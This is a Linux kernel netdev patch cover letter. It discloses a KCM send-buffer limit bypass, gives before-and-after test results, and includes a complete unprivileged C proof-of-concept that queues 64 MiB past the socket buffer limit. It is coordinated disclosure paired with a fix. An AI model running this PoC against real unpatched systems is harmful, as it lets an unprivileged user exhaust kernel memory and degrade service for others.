Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=209.85.214.176
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1795681526;
	b=V5HoBlfU3+UuM8bzxy9rhWhdkzP/XHtwAYvIJN0zz5zPB8sxQqW35UTdAayLE+7Hyz8t
	 FL2J/gP65bYb/6Gsayd28S4tr7nS8u05YEtDWC3pK8yHbdELJgDKfkWZLEs3TvlpH+xX0
	 BcJ9TsJ7kn/eLSjk0/xqFjSLb5ScpPw/NIf4jhhemo0LyhpHeTbh6YCrhsftJd9UdOdhn
	 v/n8YOrJJMUMHxLlMlQ96edtSfIC87ngkBae31DM/xWL/SRS1GB/7yv+It75SwPerBjuz
	 nIw1tZQw/whGnlmgrfDQ6t2cQ3Wjf4Rov4Gdsw8xoVB26PU44qjo3JRfmYKrRM1e0cg==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1795681526;
	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
	 X-Gm-Message-State:X-Gm-Gg:X-Received:Received:From:To:Cc:Subject:
	 Date:Message-ID:X-Mailer:MIME-Version:Content-Transfer-Encoding;
	bh=XertMZit8YjKVSUeg3lEfLqr1FPCs7d8Iitb9cCBqBc=;
	b=og4xYaWUQDT5HkIGjXmX7QAoZ5CXdL4TjJG14+qdTcTDSknON6wO1v1Ebqv2L+daQBH4
	 0yczRTngLIMjp7DzC3cpCryPxwbLnF/XpLX4T/KDTGESdNkmPoF2oW57Ed7Hf15Ijmg2/
	 9rJ/eyne+u17ujKUnHkpMLoErwPUUPFRQDfiu2erqgldH7YnCenba/dnk8XXKOBeLNzZh
	 bhkzLnWWfUPiCd2yjOgBsJTTCLfMohfgVdwAkwardoMIQ/abZ0XWjCQXOeMqbK4h84MLa
	 f2dr8Sbs7wOR1lV4dxxuzgfP9t6GI68jExkUqfGuZyz1+04JfZ84eOJJjxaHISjfr4w==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dmarc=pass header.from=nebusec.ai;
	spf=pass smtp.mailfrom=nebusec.ai;
	dkim=pass header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=nvflBL2N;
	arc=none smtp.remote-ip=209.85.214.176
Received: from mail-pl1-f176.google.com (mail-pl1-f176.google.com [209.85.214.176])
	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 1C325606A338
	for <netdev@vger.kernel.org>; Thu, 26 Nov 2026 08:25:24 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 1C325606A338
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key, unprotected) header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=nvflBL2N
Received: by mail-pl1-f176.google.com with SMTP id d9443c01a7336-2f066274caeso31949655ad.2
        for <netdev@vger.kernel.org>; Thu, 26 Nov 2026 00:25:24 -0800 (PST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1795681524; x=1796286324; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=XertMZit8YjKVSUeg3lEfLqr1FPCs7d8Iitb9cCBqBc=;
        b=nvflBL2NKuzYB0xjjuAcOEdPMmFvrmiWY3snmSWjckw7dYJR+djk8T53qj7++85VCR
         cYg17d0VO9Te4xY2y3eZnYN9E7yDDhx1vKRh8fRJzlxmuK4F8Fi7deK2IG8HwWr0pbTe
         8lxXsRqFLUOlS/KitjcbBOu45Q2Cz+NMLd/msgtRqPZS/oRRIi3ZF7fVTO/Hl0o4zOfB
         tNbjUYQPJYKL1wevCBhWDNKGFpz0vs9sP5pmZo9n8kWGDe9UwYOhBDnV9YS9SHYoBPQF
         kO1+APB4TL/HGkDlffc8MZG1wdBTuaDGVBd34+uf10vlEYqKCBxCXoSKfx/M5oFoWKBK
         uQzA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1795681524; x=1796286324;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=XertMZit8YjKVSUeg3lEfLqr1FPCs7d8Iitb9cCBqBc=;
        b=bhW6jwGWSbOy5HrpsZ1optJKYTvqUB1GC55PPg1TVk788GFdQBAYZEkSXlLvS422Ia
         YZt7AXW2Ss6OJQPM5a7+7UHm15dAp18xCc7DLW1qmLS8WD/pHqOezjCLztXBZ+N8xJHu
         fslZST8k5WkcZA53r05WuK1zf3r0cnCZ24qAhLBrfKcnpWGUYirfAKpSV1o60Wz447JQ
         MGKlpNkyxOkVvyLvw39xFdNhyKdEMKcJVhi59K1rd+H8LGuOkQ2stM46C+cXcJMnmzmp
         JTR/z9jKyuo5rZ95PEYB/ZCcE7Yq65LS0oBsP/13dWa+PUY7EOgaBc2xWK6sgXf89MTR
         DJxg==
X-Gm-Message-State: APuU4Z8Zsxm3m2Q0yAlIfeLZo0luK16cp7gJOWZpH02it4FPVQdk5UTm
	NigsY1QngADawXWSyVShugJI+4/oSSpgGEFiulwx5Cey9AAxgfizeL0RfPHF1/BpKruyFXEIXR2
	4OeYKiZ5e
X-Gm-Gg: AZFdTZdNEdCFH7NT8UpccXwGwPgNvEPvz268orCDpcrE+ok30u1t3/tdcm96J16/+JI
	WEKt7WdIQRGuZwAT8xG8Ika1H5By/Cwfhh5QumxMUCx/1kfmqXTpFsSPI9V9zTmmkz6lbOZnkeu
	4vfrCdklfSSpozGxsTDW7NlNy5BGoq4GVQ7u+pY97vqOFPcXAWxaroFfiT/uK9DHPjBMkkmiG5/
	MPfFAFM082TRLC8Asn4P6MQKrLCOtV8AIaNBCeC6tNQsaouUutz59MrmwY8Ug67I+7zyIsO+tab
	c0jouj2MwlMDkGbA53q5cO/Q8zXxY+PyN73hYKBQhxgo2FnlCer9o10/KCu3+odME0UFFRDkqYI
	dkMkv7BOlVAr0KAs7lSkG9hvEFfpXf5fQ9nMrVmKdn+26glaPRQeRxBp6QOCbuvOOG9Xn0dlM+e
	0j5yrEgoJ6nnokoVBNZtQR6SVz0s+TAYrLO8ps3b4AphF+Rs6yHAo+jlBnUbaLgZpo2z49MIFzX
	mJwhF9nf/KqTiXqOBv10l49Ed7U5tyRUid8/5KjQgUzHjYdHFbcWs6Jf7FJw3imGIPUb9TIR7Ga
	mPpBom4Ocah/gf+CtPlWj9Xot4svjrN8QTorpdC6uvRTp2OU0tVdKpuiq1RNIONeP8k316eXfbK
	b9hhPhw3taK2FmuhB27G3
X-Received: by 2002:a17:903:3783:b0:2f0:30ad:b9e4 with SMTP id d9443c01a7336-2f03f1e9130mr213562655ad.53.1795681524298;
        Thu, 26 Nov 2026 00:25:24 -0800 (PST)
Received: from 24c857d0c3be.. ([122.51.212.64])
        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2f070a12491sm76794325ad.8.2026.11.26.00.25.20
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Thu, 26 Nov 2026 00:25:23 -0800 (PST)
From: Zihan Xi <zihanx@nebusec.ai>
To: netdev@vger.kernel.org
Cc: davem@davemloft.net,
	edumazet@kernel.org,
	pabeni@redhat.com,
	willemb@google.com,
	horms@kernel.org,
	brauner@kernel.org,
	runyu.xiao@seu.edu.cn,
	jiayuan.chen@shopee.com,
	leitao@debian.org,
	rjethwani@purestorage.com,
	tom@herbertland.com,
	vega@nebusec.ai,
	zihanx@nebusec.ai
Subject: [PATCH net 0/1] kcm: enforce per-socket send buffer limit
Date: Thu, 26 Nov 2026 08:25:15 +0000
Message-ID: <cover.1795676623.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Post: <mailto:netdev@vger.kernel.org>
List-Help: <mailto:netdev+help@vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
List-Owner: <mailto:netdev+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found a send-buffer limit bypass in net/kcm/kcmsock.c.
A non-root process can reach it through AF_KCM; no TCP
attachment or BPF program is required. The relevant details
follow.

---- details below ----

An LLM was used to help create this patch.

This bug is tracked at: https://bugtracker.nebusec.ai/f/12034 (12034)

Bug details:

kcm_sendmsg() checks sk_stream_memory_free() once before its
copy loop. A send is then copied in page-fragment chunks without
checking the remaining socket send space. On the selected
baseline, a 64 MiB first send succeeded with an effective
SO_SNDBUF of 8192 bytes; a following one-byte send returned
EAGAIN. The patch bounds each copy/splice chunk by current
sk_stream_wspace(), rejects messages that cannot fit, and rolls
back accounting when a SOCK_DGRAM partial message is discarded.
This fixes the per-socket send-buffer limit; it does not add
protocol-wide aggregate accounting across KCM sockets.

Reproducer:

Compile and run as an unprivileged user in a 2-vCPU, 2-GB x86
QEMU guest with CONFIG_AF_KCM enabled:

gcc -O2 -Wall -Wextra -o kcm-mini-poc mini_poc.c
./kcm-mini-poc

On baseline c5de2ce2fccd, the unprivileged run produced:

requested_sndbuf=4096 actual_sndbuf=8192 payload=67108864 first_send=67108864
second_send=-1 (Resource temporarily unavailable)

On patched commit bba17216, the same probe produced:

requested_sndbuf=4096 actual_sndbuf=8192 payload=67108864 first_send=-1 (Message too long)
second_send=1

Additional unprivileged edge tests: an 8192-byte DGRAM message was accepted
on both kernels; an 8193-byte message was accepted on baseline and rejected
with EMSGSIZE after the patch. DGRAM MSG_MORE and SEQPACKET partial-message
over-limit continuations were accepted on baseline but rejected after the
patch; a following small send succeeded after the patched DGRAM rollback and
SEQPACKET partial preservation. With 6144 bytes already queued, a 4096-byte
splice was accepted on baseline despite only 2048 bytes remaining; the patched
kernel returned EAGAIN and accepted a later 2048-byte send after rollback.

We run the PoC in a 2-vCPU, 2-GB RAM x86 QEMU environment.

------BEGIN PoC------

#define _GNU_SOURCE
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <unistd.h>

#ifndef AF_KCM
#define AF_KCM 41
#endif
#ifndef KCMPROTO_CONNECTED
#define KCMPROTO_CONNECTED 0
#endif

int main(void)
{
	const size_t size = 64 * 1024 * 1024;
	int sndbuf = 4096, actual, fd;
	char byte = 'x';
	char *buf;
	ssize_t sent;

	fd = socket(AF_KCM, SOCK_DGRAM, KCMPROTO_CONNECTED);
	if (fd < 0) {
		perror("socket(AF_KCM)");
		return 1;
	}
	if (setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf))) {
		perror("setsockopt(SO_SNDBUF)");
		return 1;
	}
	if (getsockopt(fd, SOL_SOCKET, SO_SNDBUF, &actual,
		       &(socklen_t){ sizeof(actual) })) {
		perror("getsockopt(SO_SNDBUF)");
		return 1;
	}
	buf = mmap(NULL, size, PROT_READ | PROT_WRITE,
		   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (buf == MAP_FAILED) {
		perror("mmap");
		return 1;
	}
	memset(buf, 'x', size);
	sent = send(fd, buf, size, MSG_DONTWAIT);
	printf("requested_sndbuf=%d actual_sndbuf=%d payload=%zu first_send=%zd",
	       sndbuf, actual, size, sent);
	if (sent < 0)
		printf(" (%s)", strerror(errno));
	putchar('\n');

	errno = 0;
	sent = send(fd, &byte, sizeof(byte), MSG_DONTWAIT);
	printf("second_send=%zd", sent);
	if (sent < 0)
		printf(" (%s)", strerror(errno));
	putchar('\n');
	close(fd);
	munmap(buf, size);
	return 0;
}

------END PoC--------

Best regards,
Zihan Xi

Zihan Xi (1):
  net: kcm: check sndbuf space while building a message

 net/kcm/kcmsock.c | 43 +++++++++++++++++++++++++++++++++++++++++--
 1 file changed, 41 insertions(+), 2 deletions(-)

-- 
2.43.0

